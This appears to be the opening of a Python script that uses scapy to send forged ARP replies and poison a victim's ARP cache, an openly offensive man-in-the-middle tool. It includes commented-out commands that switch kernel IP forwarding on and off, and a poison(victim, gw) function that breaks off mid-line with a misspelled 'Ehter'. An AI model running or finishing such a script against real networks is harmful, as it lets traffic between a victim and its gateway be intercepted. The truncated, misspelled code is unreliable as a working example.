#! /usr/bin/env python3
#Sends forged ARP replies to poison target’s ARP cache.
from scapy.layers.inet import Ether, ARP
from scapy.sendrecv import send
import os
#import arping (collect mac)
#enable_forwarding = lambda os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')           # enable kernel IP forwarding
#os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')      
def poison(victim, gw):
	frame = Ehter
